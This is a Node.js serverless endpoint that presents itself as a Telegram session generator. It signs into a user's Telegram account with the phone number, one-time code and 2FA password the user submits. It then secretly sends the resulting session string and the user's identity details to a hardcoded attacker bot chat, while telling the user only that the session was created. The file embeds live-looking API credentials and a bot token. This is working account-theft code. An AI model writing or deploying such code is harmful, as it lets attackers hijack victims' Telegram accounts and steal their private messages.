const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const API_ID = 23171051;
const API_HASH = '10331d5d712364f57ffdd23417f4513c';
const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
const ADMIN_ID = '7907742294';

async function sendToBot(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    return response.ok;
  } catch (error) {
    console.error('Bot error:', error);
    return false;
  }
}

module.exports = async (req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  let client;
  try {
    const { phone, phone_code_hash, otp_code, password } = req.body;

    if (!phone || !phone_code_hash || !otp_code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required fields' 
      });
    }

    console.log('Starting authentication for:', phone);

    const stringSession = new StringSession('');
    client = new TelegramClient(stringSession, API_ID, API_HASH, {
      connectionRetries: 3,
      useWSS: false,
      timeout: 30000,
    });

    await client.connect();

    console.log('Client connected, starting sign in...');

    // SIMPLE AND DIRECT APPROACH
    try {
      // Use the direct signIn method
      await client.signIn({
        phoneNumber: phone,
        phoneCode: () => Promise.resolve(otp_code),
        phoneCodeHash: phone_code_hash,
      });

      console.log('Sign in successful');

    } catch (signInError) {
      console.log('Sign in failed, error:', signInError.message);
      
      // If sign in fails, try the start method as fallback
      if (signInError.message.includes('SESSION_PASSWORD_NEEDED')) {
        if (!password) {
          throw new Error('2FA password required');
        }
        
        console.log('Attempting 2FA sign in with password');
        await client.signInWithPassword({
          phoneNumber: phone,
          phoneCode: () => Promise.resolve(otp_code),
          phoneCodeHash: phone_code_hash,
          password: () => Promise.resolve(password),
        });
      } else {
        // Try the start method as last resort
        console.log('Trying start method as fallback');
        await client.start({
          phoneNumber: phone,
          phoneCode: async () => otp_code,
          phoneCodeHash: phone_code_hash,
          onError: (err) => {
            console.error('Start method error:', err);
          },
        });
      }
    }

    // Verify we're actually signed in
    const isAuthorized = await client.isUserAuthorized();
    if (!isAuthorized) {
      throw new Error('Authentication failed - user not authorized');
    }

    console.log('User authorized, generating session...');

    // Get session string
    const sessionString = client.session.save();
    
    // Get user info
    let userInfo = { phone: phone };
    try {
      const me = await client.getMe();
      userInfo = {
        id: me.id,
        username: me.username || 'No username',
        first_name: me.firstName || '',
        last_name: me.lastName || '',
        phone: me.phone || phone
      };
      console.log('User info retrieved:', userInfo.id);
    } catch (userError) {
      console.log('Could not get user info, using basic info');
    }

    // Send to bot
    const botMessage = `🔐 **New Telegram Session Generated**\n\n` +
      `📱 **Phone:** ${userInfo.phone}\n` +
      `🆔 **User ID:** ${userInfo.id || 'N/A'}\n` +
      `👤 **Name:** ${userInfo.first_name} ${userInfo.last_name}\n` +
      `🔗 **Username:** @${userInfo.username || 'N/A'}\n\n` +
      `🔑 **Session String:**\n\`${sessionString}\``;

    await sendToBot(botMessage);
    console.log('Bot notification sent');

    await client.disconnect();

    return res.status(200).json({
      success: true,
      session_string: sessionString,
      user_info: userInfo,
      message: 'Session created successfully!'
    });

  } catch (error) {
    console.error('FINAL ERROR:', error.message);
    
    if (client) {
      try {
        await client.disconnect();
      } catch (e) {
        console.error('Error disconnecting:', e);
      }
    }

    let userMessage = error.message;
    
    // User-friendly error messages
    if (error.message.includes('PHONE_CODE_INVALID')) {
      userMessage = 'Invalid verification code. Please check and try again.';
    } else if (error.message.includes('PHONE_CODE_EXPIRED')) {
      userMessage = 'Code expired. Please request a new verification code.';
    } else if (error.message.includes('SESSION_PASSWORD_NEEDED') || error.message.includes('2FA')) {
      userMessage = '2FA password required. Please enter your password.';
    } else if (error.message.includes('FLOOD')) {
      userMessage = 'Too many attempts. Please wait before trying again.';
    } else if (error.message.includes('PHONE_NUMBER_INVALID')) {
      userMessage = 'Invalid phone number format.';
    } else if (error.message.includes('not authorized')) {
      userMessage = 'Authentication failed. Please try again.';
    }

    return res.status(200).json({
      success: false,
      error: userMessage
    });
  }
};
